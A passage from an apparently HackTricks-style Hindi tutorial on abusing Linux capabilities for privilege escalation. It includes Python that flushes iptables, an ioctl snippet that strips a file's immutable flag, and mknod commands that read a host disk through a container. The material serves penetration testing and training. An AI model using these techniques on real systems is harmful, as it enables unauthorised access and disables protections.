print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability holder को exposed network namespaces के भीतर **network configurations बदलने** की शक्ति प्रदान करता है, जिसमें firewall settings, routing tables, socket permissions और network interface settings शामिल हैं। यह network interfaces पर **promiscuous mode** चालू करने की सुविधा भी देता है, जिससे namespaces के across packet sniffing संभव हो जाती है।

**Example with binary**

मान लेते हैं कि **python binary** के पास ये capabilities हैं।
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP_LINUX_IMMUTABLE

**इसका अर्थ है कि inode attributes को modify करना संभव है।** इस capability से आप सीधे privileges escalate नहीं कर सकते।

**binary के साथ उदाहरण**

यदि आपको पता चलता है कि कोई file immutable है और python के पास यह capability है, तो आप **immutable attribute को remove करके file को modifiable बना सकते हैं:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
> [!TIP]
> ध्यान दें कि आमतौर पर यह immutable attribute निम्नलिखित commands का उपयोग करके set और remove किया जाता है:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `chroot(2)` system call के execution को enable करता है, जिससे known vulnerabilities के माध्यम से `chroot(2)` environments से escape करना संभव हो सकता है:

- [How to break out from various chroot solutions](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [chw00t: chroot escape tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) system restarts के लिए `reboot(2)` system call के execution की अनुमति देने के साथ-साथ, कुछ hardware platforms के लिए बनाए गए `LINUX_REBOOT_CMD_RESTART2` जैसे specific commands को भी support करता है। इसके अलावा, यह नए या signed crash kernels को क्रमशः load करने के लिए `kexec_load(2)` और Linux 3.17 से `kexec_file_load(2)` के उपयोग को भी enable करता है।

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) को Linux 2.6.37 में व्यापक **CAP_SYS_ADMIN** से अलग किया गया था, ताकि विशेष रूप से `syslog(2)` call का उपयोग करने की ability प्रदान की जा सके। जब `kptr_restrict` setting 1 पर हो, तब यह capability `/proc` और similar interfaces के माध्यम से kernel addresses को देखने की अनुमति देती है। यह setting kernel addresses के exposure को control करती है। Linux 2.6.39 से `kptr_restrict` का default 0 है, जिसका अर्थ है कि kernel addresses exposed होते हैं, हालांकि security reasons के कारण कई distributions इसे 1 (uid 0 को छोड़कर addresses hide करना) या 2 (addresses को हमेशा hide करना) पर set करती हैं।

इसके अतिरिक्त, जब `dmesg_restrict` को 1 पर set किया जाता है, तब **CAP_SYSLOG** `dmesg` output तक access की अनुमति देता है। इन changes के बावजूद, historical precedents के कारण **CAP_SYS_ADMIN** में `syslog` operations करने की ability बनी रहती है।

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) `mknod` system call की functionality को regular files, FIFOs (named pipes) या UNIX domain sockets बनाने से आगे बढ़ाता है। यह विशेष रूप से special files बनाने की अनुमति देता है, जिनमें शामिल हैं:

- **S_IFCHR**: Character special files, जो terminals जैसे devices होते हैं।
- **S_IFBLK**: Block special files, जो disks जैसे devices होते हैं।

यह capability उन processes के लिए essential है जिन्हें device files बनाने की ability चाहिए, जिससे character या block devices के माध्यम से direct hardware interaction संभव हो पाता है।

यह एक default docker capability है ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19))।

यह capability निम्नलिखित conditions में host पर privilege escalations (full disk read के माध्यम से) की अनुमति देती है:

1. Host तक initial access होना (Unprivileged)।
2. Container तक initial access होना (Privileged (EUID 0), और effective `CAP_MKNOD`)।
3. Host और container को same user namespace share करना चाहिए।

**Container में Block Device Create और Access करने के Steps:**

1. **Standard User के रूप में Host पर:**

- `id` के साथ अपनी current user ID determine करें, जैसे `uid=1000(standarduser)`।
- Target device identify करें, उदाहरण के लिए `/dev/sdb`।

2. **`root` के रूप में Container के अंदर:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Host पर वापस:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
यह approach standard user को container के माध्यम से `/dev/sdb` से data access करने और संभावित रूप से read करने की अनुमति देता है, जिसमें shared user namespaces और device पर निर्धारित permissions का exploitation किया जाता है।

### CAP_SETPCAP

**CAP_SETPCAP** किसी process को **किसी अन्य process के capability sets को बदलने** में सक्षम बनाता है, जिससे effective, inheritable और permitted sets में capabilities जोड़ना या हटाना संभव होता है। हालांकि, कोई process केवल उन्हीं capabilities को modify कर सकता है जो उसके अपने permitted set में मौजूद हों, जिससे यह सुनिश्चित होता है कि वह किसी अन्य process के privileges को अपने privileges से आगे elevate नहीं कर सकता। Recent kernel updates ने इन rules को और strict कर दिया है, जिससे `CAP_SETPCAP` केवल अपने या अपने descendants के permitted sets के भीतर capabilities को कम करने तक सीमित हो गया है, जिसका उद्देश्य security risks को कम करना है। इसके उपयोग के लिए effective set में `CAP_SETPCAP` और permitted set में target capabilities का होना आवश्यक है, तथा modifications के लिए `capset()` का उपयोग किया जाता है। यह `CAP_SETPCAP` के core function और limitations का सारांश है, जो privilege management और security enhancement में इसकी भूमिका को दर्शाता है।

**`CAP_SETPCAP`** एक Linux capability है जो किसी process को **किसी अन्य process के capability sets को modify** करने की अनुमति देती है। यह अन्य processes के effective, inheritable और permitted capability sets में capabilities जोड़ने या हटाने की क्षमता प्रदान करती है। हालांकि, इस capability के उपयोग पर कुछ restrictions हैं।

`CAP_SETPCAP` वाला process **केवल उन्हीं capabilities को grant या remove कर सकता है जो उसके अपने permitted capability set में मौजूद हैं**। दूसरे शब्दों में, यदि किसी process के पास कोई capability स्वयं नहीं है, तो वह उसे किसी अन्य process को grant नहीं कर सकता। यह restriction किसी process को दूसरे process के privileges को अपने privilege level से आगे elevate करने से रोकती है।

इसके अलावा, recent kernel versions में `CAP_SETPCAP` capability को **और अधिक restricted** किया गया है। अब यह किसी process को अन्य processes के capability sets को मनमाने तरीके से modify करने की अनुमति नहीं देती। इसके बजाय, यह **केवल किसी process को अपने permitted capability set या अपने descendants के permitted capability set में capabilities को कम करने** की अनुमति देती है। यह बदलाव capability से जुड़े संभावित security risks को कम करने के लिए किया गया था।

`CAP_SETPCAP` का प्रभावी रूप से उपयोग करने के लिए आपके effective capability set में यह capability और permitted capability set में target capabilities का होना आवश्यक है। इसके बाद आप अन्य processes के capability sets को modify करने के लिए `capset()` system call का उपयोग कर सकते हैं।

संक्षेप में, `CAP_SETPCAP` किसी process को अन्य processes के capability sets को modify करने की अनुमति देती है, लेकिन वह ऐसी capabilities grant नहीं कर सकती जो उसके पास स्वयं नहीं हैं। इसके अतिरिक्त, security concerns के कारण recent kernel versions में इसकी functionality को सीमित कर दिया गया है, ताकि यह केवल अपने permitted capability set या अपने descendants के permitted capability sets में capabilities को कम कर सके।

## References

**इनमें से अधिकांश examples** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com) **के कुछ labs से लिए गए हैं, इसलिए यदि आप इन privesc techniques का practice करना चाहते हैं, तो मैं इन labs की recommend करता हूं।**

**अन्य references**:

- [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
- [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
- [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​
{{#include ../../banners/hacktricks-training.md}}
